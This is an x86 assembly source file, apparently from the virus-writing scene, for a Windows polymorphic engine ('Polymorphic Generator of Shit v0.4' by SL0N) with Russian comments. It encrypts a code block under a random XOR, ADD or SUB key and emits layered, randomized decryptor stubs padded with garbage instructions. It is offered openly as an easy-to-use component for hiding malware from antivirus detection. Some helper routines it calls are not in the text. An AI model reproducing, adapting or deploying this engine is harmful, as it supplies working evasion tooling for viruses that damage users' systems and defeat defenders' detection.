;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                       [POLYMORPHIC GENERATOR OF SHIT V. 0.4]                 ;
;                                                                              ;
;		      #########        ########      ########                  ;
;		      ###########    ##########    ##########                  ;
;		      ##### ######  ######   ##   ######   ##                  ;
;		      #####  #####  #####         #####                        ;
;		      #####  #####  #####          ########                    ;
;		      ###########   ##### ######     ########                  ;
;		      #########     ##### ######         #####                 ;
;		      #####         #####    ###         #####                 ;
;		      #####          ###########  ###########                  ;
;		      #####            ##### ###  #########                    ;
;                                                                              ;
;                                  FOR MS WINDOWS                              ;
;                                                                              ;
;                                     BY SL0N                                  ;
;------------------------------------------------------------------------------;
;                                    MANUAL:                                   ;
; BUFFER FOR ENCRYPTED CODE + DECRYPTORS  -> EDI                               ;
; START OF CODE 	                  -> EAX                               ;
; SIZE OF CODE  	                  -> ECX                               ;
;                                                                              ;
; CALL MORPH                                                                   ;
;                                                                              ;
; SIZE OF ENCRYPTED CODE + DECRYPTORS     -> ECX                               ;
; BUFFER WITH ENCRYPTED CODE + DECRYPTORS -> EDI			       ;
;------------------------------------------------------------------------------;
; (+) DO NOT USE WIN API                                                       ;
; (+) EASY TO USE                                                              ;
; (+) GENERATE GARBAGE INSTRUCTIONS (1,2,3,4,5,6 BYTES)                        ;
; (+) USE DELTA OFFSET                                                         ;
; (+) USE X87 INSTRUCTIONS                                                     ;
; (+) IT CREATES VARIABLE DECRYPTOR SIZE                                       ;
; (+) RANDOMLY CHANGE REGISTERS IN INSTRUCTIONS                                ;
; (+) RANDOM 32 BIT ENCRYPTION ALGORITHM (ADD/SUB/XOR)                         ;
; (+) RANDOM NUMBER OF DECRYPTORS                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
morph:
                push	esi ebp                    ; Сохраняем регистры 

		call	delta0                     ; 
delta0:                                            ; Вычисляем 
		pop	ebp                        ; дельта смещение
		sub	ebp,offset delta0          ;

		push	eax                        ; Кладём в стэк eax
decr_number:                                       
		mov	eax,40                     ; Генерируем случайное число
		call	brandom32                  ; в диапазоне 0..30
		test	eax,eax                    ; Если число равно 0, то оно
		jz	decr_number                ; нам не подходит
		mov	ebx,eax                    ; Помещаем число в ebx
		pop	eax                        ; Восстанавливаем eax
multi_decr:		                           
		mov	edx,edi
		call	polym                      ; 
		mov	eax,edx                    ; 
		add	edi,ecx                    ; Генерируем столько 
		dec	ebx                        ; декрипторов, сколько
		test	ebx,ebx                    ; записано в регистре ebx
		jnz	multi_decr                 ;

		sub	edi,ecx                    ; результатами
		
		pop	ebp esi                    ; Восстанавливаем регистры
                ret                                ; Возврат из подпрограммы
;------------------------------------------------------------------------------;
polym:
		push	ebp edi esi ebx            ; Сохраняем регистры

		mov	[ebp+sz_code],ecx          ; Заносим параметры старта
		mov	[ebp+begin_code],eax       ; из регистров в переменные
		mov	[ebp+buff],edx             ;
		mov	edi,edx	                   ;
;------------------------------------------------------------------------------;
		call	len_gen                    ; Вызываем генератор длин
		mov	[ebp+sz_decr],40
		add	[ebp+sz_decr],ecx          ; добавляем длины мусора к
                                                   ; размеру декриптора

		call	reg_mutate		   ; Выбираем регистры, которые
		                                   ; будут использоваться в
						   ; декрипторе

		mov	ecx,[ebp+len+0]            ; И генерируем первую партию
		call	garbage                    ; мусорных инструкций

		mov	al,0e8h			   ; Генерируем следующую
		stosb                              ; инструкцию: call $+5
		xor	eax,eax                    ;
		stosd                              ; 

		mov	ecx,[ebp+len+4]            ; Генерируем новую партию
		call	garbage                    ; мусорных инструкций

	        mov	al,58h                     ; Генерируем следующую
		add	al,bh                      ; инструкцию декриптора:
		stosb	                           ; pop reg1

		mov	ecx,[ebp+len+8]		   ; Генерируем мусорные
		call	garbage                    ; инструкции

		                                   ; Генерируем следующую
		mov	al,81h                     ; инструкцию декриптора:
		stosb                              ; add reg1,sz_decr-len[0]
		mov	al,0c0h                    ; 
		add	al,bh                      ; Таким образом reg1 будет
		stosb                              ; указывать на начало
		                                   ; закриптованного кода
		mov	eax,[ebp+sz_decr]          ;
		sub	eax,[ebp+len]	           ;
		sub	eax,9			   ; 
		stosd				   ;

		mov	ecx,[ebp+len+12]	   ; Генерируем мусорные
		call	garbage                    ; инструкции

		mov	al,8bh			   ; Генерируем инструкцию:
		stosb                              ; mov reg2,reg1
		                                   ;
		mov	al,bl                      ; У нас reg2 позже будет
		shl	al,3			   ; использоваться для
		add	al,0c0h                    ; сравнения
		add	al,bh                      ;
		stosb

		mov	ecx,[ebp+len+16]	   ; Генерируем мусорные
		call	garbage                    ; инструкции

		mov	al,81h                     ;
		stosb                              ; 
		mov	al,0c0h                    ;
		add	al,bl                      ;
		stosb                              ;
			                           ; Генерируем инструкцию:
		mov	eax,[ebp+sz_code]          ; add reg2,size_code
		inc	eax
		stosd                              ;

		mov	ecx,[ebp+len+20]	   ; Генерируем мусорные
		call	garbage                    ; инструкции

		mov	al,81h                     ;
		stosb                              ; Генерируем следующую
		mov	al,0c0h                    ; инструкцию: add reg1,4
		add	al,bh                      ;
		stosb                              ;
		                                   ;
		mov	eax,4                      ;
		stosd                              ;

		mov	ecx,[ebp+len+24]           ; Генерируем следующую
		call	garbage                    ; партию мусора

		call	random32                   ;
		mov	[ebp+key2],eax             ; Сохраняем ключ криптования

		lea	eax,[ebp+next]             ; Кладём в стэк смещение
		push	eax                        ; на метку next
						   ; Выбираем один из трёх
		                                   ; вариантов криптования
		mov	eax,3                      ; случайным образом.
		call	brandom32                  ;
		                                   ; Алгоритмы криптования и
		cmp	al,1                       ; декриптования:
		je	enc_add32                  ;
		                                   ; 1) XOR
		cmp	al,2                       ; 2) ADD
		je	enc_sub32                  ; 3) SUB
enc_xor32:
		                                   
		mov	al,81h                     ;
		stosb                              ; Генерируем инструкцию:
		mov	al,30h                     ; xor [reg1],key_decrypt
		add	al,bh                      ;
		stosb                              ;
		mov	eax,[ebp+key2]
		stosd

		push	edi                        ; 
		lea	edi,[ebp+crypt_n]          ; 
		mov	al,33h                     ; А в самом движке меняется
		stosb                              ; алгоритм криптования 
		pop	edi                        ;
		ret                                ; Переход на метку next
enc_add32:
		mov	al,81h                     ; 
		stosb                              ; Генерируем инструкцию:
		mov	al,bh                      ; add [reg1],key_decrypt
		stosb                              ;

		mov	eax,[ebp+key2]
		stosd

		push	edi                        ; 
		lea	edi,[ebp+crypt_n]          ; 
		mov	al,2bh                     ; А в самом движке меняется
		stosb                              ; алгоритм криптования 
		pop	edi                        ;
		ret                                ; Переход на метку next

enc_sub32:
		mov	al,81h                     ;
		stosb                              ; Генерируем следующую
		mov	al,028h                    ; инструкцию:
		add	al,bh                      ; sub [reg1],key_decrypt
		stosb                              ;

		mov	eax,[ebp+key2]
		stosd

		push	edi                        ;
		lea	edi,[ebp+crypt_n]          ; А в самом движке меняем
		mov	al,03h                     ; алгоритм криптования
		stosb                              ;
		pop	edi                        ;
		ret                                ; Переход на метку next
;------------------------------------------------------------------------------;
next: 
		mov	ecx,[ebp+len+28]           ; Генерируем очередную
		call	garbage                    ; партию мусора
                                                   
		mov	al,3bh                     ; 
		stosb                              ;
			                           ;
		xor	eax,eax                    ;
		mov	al,bh                      ; Генерируем инструкцию:
		shl	al,3                       ; cmp reg1,reg2
		add	al,0c0h                    ;
		add	al,bl                      ;
		stosb                              ;
;------------------------------------------------------------------------------;
		mov	ax,820fh                   ; 
		stosw                              ; 
		xor	eax,eax                    ;
		dec	eax                        ; Генерируем инструкцию:
		mov	ecx,7*4                    ; jb decrypt
		sub	eax,[ebp+len+ecx]          ;
		mov	ecx,6*4                    ;
		sub	eax,[ebp+len+ecx]          ;
		sub	eax,19                     ;  
		stosd                              ;

	        mov	ecx,[ebp+len+32]           ; Генерируем мусорные
		call	garbage                    ; инструкции
;------------------------------------------------------------------------------;
		mov	ecx,[ebp+sz_code]          ;
		mov	esi,[ebp+begin_code]       ;
		add	ecx,esi                    ;
encrypt:                                           ;
		lodsd                              ; Криптуем весь код ключом
crypt_n:                                           ; и нужным алгоритмом
		xor	eax,[ebp+key2]             ;
		stosd                              ;
		cmp	esi,ecx                    ;
		jl	encrypt                    ;

		mov	edx,[ebp+buff]             ; Заполняем регистры
		mov	ecx,[ebp+sz_code]          ; результатами
		add	ecx,[ebp+sz_decr]          ;

		pop	ebx esi edi ebp            ; Востанавливаем регистры
		ret                                ; И выходим из процедуры
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;     		      GARBAGE LENGTH GENERATOR SUBROUTINE                      ;
;------------------------------------------------------------------------------;
;			          [ IN ]				       ;
;                                                                              ;
;          		    NO INPUT IN SUBROTINE                              ;
;------------------------------------------------------------------------------;
;			          [ OUT ]				       ;
;						 			       ;
;               	 LENGTH OF ALL GARBAGE -> ECX                          ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
len_gen:                                           ; Подпрограмма генерации
                                                   ; длин для мусорных
						   ; инструкций
		xor	ecx,ecx                    ; Обнуляем esi и ecx
		xor	esi,esi                    ;
loop1:                                             ;
		mov	eax,100                    ;
		call	brandom32                  ; Начинаем генерацию
			                           ; длин, каждое число
		mov	[ebp+len+esi],eax          ; диапазоне 0..100
		add	ecx,eax                    ;
		add	esi,4                      ;
		cmp	esi,36                     ;
		jne	loop1                      ;
		ret                                ; Возврат из подпрограммы
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;			  REGISTER MUTATOR SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          		     NO INPUT IN SUBROTINE                             ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;									       ;
;                         USES REGISTER N1 -> BH (0..7)                        ;
;                         USES REGISTER N2 -> BL (0..7)                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
reg_mutate:                                         
                                                   ; Подпрограмма генерации
generate1:                                         ; регистров для декриптора

		mov	eax,8                      ; Получаем случайное число
		call	brandom32                  ; в диапазоне 0..7
		cmp	al,00000100b               ; Используем все регистры 
		je	generate1                  ; кроме esp
		cmp	al,00000101b               ; Используем все регистры 
		je	generate1                  ; кроме ebp
		mov	bh,al                      ; Сохраняем полученный
		                                   ; регистр
generate2:
		mov	eax,8                      ; Получаем случайное число
		call	brandom32                  ; в диапазоне 0..7
		cmp	al,bh                      ; Не должно быть двух
		je	generate2                  ; идентичных регистров
		cmp	al,00000100b               ; Используем все регистры 
		je	generate2                  ; кроме esp
		mov	bl,al                      ; Сохраняем полученный
		                                   ; регистр
		ret                                ; Возврат из подпрограммы
;------------------------------------------------------------------------------;
sz_decr         dd	0                  	   ; 
begin_code      dd	0                          ; Данные необходимые для
st_code         dd	0                          ; корректной работы 
sz_code         dd	0                          ; генератора
buff		dd	0			   ;
key2            dd	0                          ;
;------------------------------------------------------------------------------;
	len	dd	0,0,0,0,0,0,0,0,0          ; Место для хранения длин
;------------------------------------------------------------------------------;
